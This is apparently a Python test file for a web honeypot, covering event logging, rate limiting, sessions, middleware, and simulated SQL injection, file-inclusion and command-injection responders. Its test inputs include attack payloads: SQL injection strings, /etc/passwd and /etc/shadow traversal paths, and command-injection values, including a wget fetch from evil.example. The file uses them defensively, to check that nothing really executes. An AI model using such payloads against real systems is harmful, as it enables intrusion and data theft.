"""Tests de las piezas que no dependen de FastAPI: eventos, logger, rate limit, simuladores y
middleware (con una app ASGI de juguete)."""
from __future__ import annotations

import asyncio
import json
import time
from pathlib import Path
from typing import Any

from app import events
from app.config import Settings
from app.event_logger import EventLogger
from app.middleware import HoneypotMiddleware, resolve_source
from app.ratelimit import RateLimiter
from app.sessions import SessionStore
from app.sim import cmd, lfi, sql
from tests.schema import validate_event


# ------------------------------------------------------------------ eventos y logger
def _event(**kw: Any) -> dict[str, Any]:
    base = dict(
        now=None, src_ip="203.0.113.5", src_port=51234, dst_port=8080, method="GET", path="/",
        query="", headers={"user-agent": "curl/8.5.0"}, body=b"", status=200,
    )
    base.update(kw)
    return events.build_event(**base)


def test_event_matches_schema() -> None:
    ev = _event()
    assert validate_event(ev) == []
    assert ev["http"]["user_agent"] == "curl/8.5.0"


def test_body_truncated_to_8kb() -> None:
    ev = _event(body=b"A" * 50_000, method="POST")
    assert len(ev["http"]["body"]) == 8192


def test_headers_lowercase_and_joined() -> None:
    h = events.clean_headers([(b"Host", b"x"), (b"X-A", b"1"), (b"x-a", b"2")])
    assert h == {"host": "x", "x-a": "1, 2"}


def test_logger_writes_json_lines_and_survives_bad_path(tmp_path: Path) -> None:
    log = EventLogger(str(tmp_path / "web.jsonl"), use_queue=True)
    for _ in range(5):
        log.log(_event())
    log.close()
    lines = (tmp_path / "web.jsonl").read_text().splitlines()
    assert len(lines) == 5 and all(json.loads(x)["honeypot"] == "web" for x in lines)

    broken = EventLogger("/proc/definitely/not/writable/web.jsonl", use_queue=False)  # cae a stderr
    broken.log(_event())  # no debe lanzar
    broken.log({"x": object()})  # serializable gracias a default=str
    broken.close()


def test_logger_rotation(tmp_path: Path) -> None:
    log = EventLogger(str(tmp_path / "web.jsonl"), max_bytes=2000, backups=2, use_queue=False)
    for _ in range(50):
        log.log(_event())
    log.close()
    assert (tmp_path / "web.jsonl.1").exists()
    assert not (tmp_path / "web.jsonl.3").exists()


# ------------------------------------------------------------------ rate limit y sesiones
def test_rate_limiter_burst_then_block_then_refill() -> None:
    rl = RateLimiter(per_min=60, burst=3)
    assert [rl.allow("a", now=0.0) for _ in range(4)] == [True, True, True, False]
    assert rl.allow("b", now=0.0)  # otra IP no se ve afectada
    assert rl.allow("a", now=2.0)  # tras 2 s se rellenan 2 tokens
    assert RateLimiter(0, 1).allow("a")  # 0 = desactivado


def test_session_store() -> None:
    s = SessionStore(ttl_s=60, max_entries=2)
    a, b, c = s.create(), s.create(), s.create()
    assert not s.is_valid(a) and s.is_valid(b) and s.is_valid(c)  # tope de 2: se expulsa la más antigua
    s.delete(b)
    assert not s.is_valid(b) and not s.is_valid(None) and not s.is_valid("zzz")


# ------------------------------------------------------------------ simuladores
def test_sql_simulator() -> None:
    assert sql.simulate("sistemas").rows
    assert sql.simulate("'").is_error and "error in your SQL syntax" in sql.simulate("'").error_message
    taut = sql.simulate("' OR 1=1-- -")
    assert taut.columns[-1] == "password_hash" and len(taut.rows) == 5
    un = sql.simulate("x' UNION SELECT 1,version(),database()-- -")
    assert ("1", "8.0.32-0ubuntu0.20.04.2", "intranet") in un.rows
    assert sql.simulate("x' UNION SELECT 1,2-- -").error_code == 1222
    users = sql.simulate("' UNION SELECT username,password,email FROM users-- -")
    assert any(r[0] == "admin" for r in users.rows)
    assert sql.simulate("1' AND 1=2-- -").rows == []
    assert sql.simulate("' AND SLEEP(30)-- -", sleep_cap_s=2.0).delay_s == 2.0
    assert sql.simulate("a" * 10_000).error_code is None  # no revienta con inputs enormes


def test_lfi_simulator_never_reads_real_files(tmp_path: Path) -> None:
    secret = tmp_path / "real_secret.txt"
    secret.write_text("TOP-SECRET-REAL-CONTENT")
    res = lfi.resolve(str(secret))
    assert res.kind == "missing" and "TOP-SECRET" not in res.content
    assert "root:x:0:0:" in lfi.resolve("../../../../etc/passwd").content
    assert lfi.resolve("/etc/shadow").kind == "denied"
    assert lfi.resolve("http://evil.example/shell.txt").kind == "wrapper"
    assert lfi.resolve("php://filter/convert.base64-encode/resource=config.php").kind == "ok"
    assert lfi.resolve("about.txt").kind == "ok"


def test_cmd_simulator_executes_nothing(tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    out = cmd.simulate_ping(f"127.0.0.1; touch {marker}; id")
    assert "uid=33(www-data)" in out and "bytes of data" in out
    assert not marker.exists()
    assert "www-data" in cmd.simulate_ping("x | whoami")
    assert "Name or service not known" in cmd.simulate_ping("nohost")
    assert "failed: Connection timed out" in cmd.simulate_ping("1.1.1.1; wget http://evil.example/x.sh")


# ------------------------------------------------------------------ middleware con app de juguete
class Capture:
    def __init__(self) -> None:
        self.events: list[dict[str, Any]] = []

    def log(self, ev: dict[str, Any]) -> None:
        self.events.append(ev)


async def _toy_app(scope: dict[str, Any], receive: Any, send: Any) -> None:
    path = scope["path"]
    if path == "/boom":
        raise RuntimeError("fallo interno")
    if path == "/slow":
        await asyncio.sleep(5)
    scope["hp_extra"]["event_type"] = "auth_attempt" if path == "/login" else "request"
    if path == "/login":
        scope["hp_extra"]["auth"] = {"username": "root", "password": "toor", "success": False}
    await send({"type": "http.response.start", "status": 200, "headers": [(b"server", b"uvicorn")]})
    await send({"type": "http.response.body", "body": b"ok"})


async def _call(mw: HoneypotMiddleware, path: str = "/", method: str = "GET", body: bytes = b"",
                headers: list[tuple[bytes, bytes]] | None = None, client: Any = ("203.0.113.5", 51234),
                query: bytes = b"") -> tuple[int | None, dict[str, str], bytes]:
    sent: list[dict[str, Any]] = []
    queue = [{"type": "http.request", "body": body, "more_body": False}]

    async def receive() -> dict[str, Any]:
        if queue:
            return queue.pop(0)
        await asyncio.sleep(0.01)
        return {"type": "http.disconnect"}

    async def send(msg: dict[str, Any]) -> None:
        sent.append(msg)

    hdrs = [(b"host", b"intranet.test:8080"), (b"user-agent", b"pytest")] + (headers or [])
    scope = {"type": "http", "method": method, "path": path, "query_string": query,
             "headers": hdrs, "client": client, "server": ("172.30.0.2", 8080)}
    await mw(scope, receive, send)
    start = next((m for m in sent if m["type"] == "http.response.start"), None)
    resp_headers = {k.decode().lower(): v.decode() for k, v in (start or {}).get("headers", [])}
    resp_body = b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")
    return (start["status"] if start else None), resp_headers, resp_body


def _mw(**overrides: Any) -> tuple[HoneypotMiddleware, Capture]:
    cap = Capture()
    s = Settings(**{"rate_limit_per_min": 0, "request_timeout_s": 0.3, "body_read_timeout_s": 0.3, **overrides})
    mw = HoneypotMiddleware(_toy_app, settings=s, event_logger=cap,  # type: ignore[arg-type]
                            limiter=RateLimiter(s.rate_limit_per_min, s.rate_limit_burst),
                            sessions=SessionStore())
    return mw, cap


def test_middleware_logs_and_fakes_server_header() -> None:
    mw, cap = _mw()
    status, headers, _ = asyncio.run(_call(mw, "/search", query=b"q=1%27+OR+1%3D1--"))
    assert status == 200
    assert headers["server"] == "Apache/2.4.41 (Ubuntu)" and headers["x-powered-by"] == "PHP/7.4.3"
    (ev,) = cap.events
    assert validate_event(ev) == []
    assert ev["http"]["query"] == "q=1' OR 1=1--" and ev["dst_port"] == 8080 and ev["http"]["status"] == 200


def test_middleware_auth_extras_and_event_type() -> None:
    mw, cap = _mw()
    asyncio.run(_call(mw, "/login", "POST", b"username=root&password=toor"))
    ev = cap.events[0]
    assert ev["event_type"] == "auth_attempt" and ev["auth"] == {"username": "root", "password": "toor", "success": False}
    assert ev["http"]["body"] == "username=root&password=toor"


def test_middleware_source_ip_and_proxy_trust() -> None:
    xff = [(b"x-forwarded-for", b"6.6.6.6, 198.51.100.9")]
    mw, cap = _mw()
    asyncio.run(_call(mw, headers=xff))
    assert cap.events[0]["src_ip"] == "203.0.113.5" and cap.events[0]["src_port"] == 51234
    mw, cap = _mw(trust_proxy=True)
    asyncio.run(_call(mw, headers=xff))
    assert cap.events[0]["src_ip"] == "198.51.100.9" and cap.events[0]["src_port"] is None
    assert resolve_source(("not-an-ip", 1), {}, False) == (None, None)


def test_middleware_body_limits() -> None:
    mw, cap = _mw(max_body_bytes=100)
    status, _, body = asyncio.run(_call(mw, "/comment", "POST", b"x" * 500))
    assert status == 413 and b"Request Entity Too Large" in body
    status, _, _ = asyncio.run(_call(mw, "/comment", "POST", b"x" * 50, [(b"content-length", b"9999")]))
    assert status == 413
    assert [e["http"]["status"] for e in cap.events] == [413, 413]  # también se registran
    status, _, _ = asyncio.run(_call(mw, "/upload", "POST", b"x" * 500))  # /upload tiene otro límite
    assert status == 200


def test_middleware_rate_limit() -> None:
    mw, cap = _mw(rate_limit_per_min=60, rate_limit_burst=3)
    mw.limiter = RateLimiter(60, 3)
    codes = [asyncio.run(_call(mw))[0] for _ in range(5)]
    assert codes == [200, 200, 200, 429, 429]
    assert len(cap.events) == 5  # los bloqueados también quedan registrados


def test_middleware_survives_app_errors_timeouts_and_logger_failures() -> None:
    mw, cap = _mw()
    status, headers, body = asyncio.run(_call(mw, "/boom"))
    assert status == 500 and b"Internal Server Error" in body and headers["server"].startswith("Apache")
    status, _, body = asyncio.run(_call(mw, "/slow"))
    assert status == 504
    assert [e["http"]["status"] for e in cap.events] == [500, 504]

    class Exploding:
        def log(self, ev: Any) -> None:
            raise OSError("disco lleno")

    mw.events = Exploding()  # type: ignore[assignment]
    assert asyncio.run(_call(mw))[0] == 200  # un fallo de logging NO tumba la petición


def test_middleware_ignores_forged_session_cookie() -> None:
    mw, cap = _mw()
    asyncio.run(_call(mw, headers=[(b"cookie", b"PHPSESSID=deadbeef")]))
    assert cap.events[0]["session_id"] is None
    sid = mw.sessions.create()
    asyncio.run(_call(mw, headers=[(b"cookie", f"PHPSESSID={sid}".encode())]))
    assert cap.events[1]["session_id"] == sid
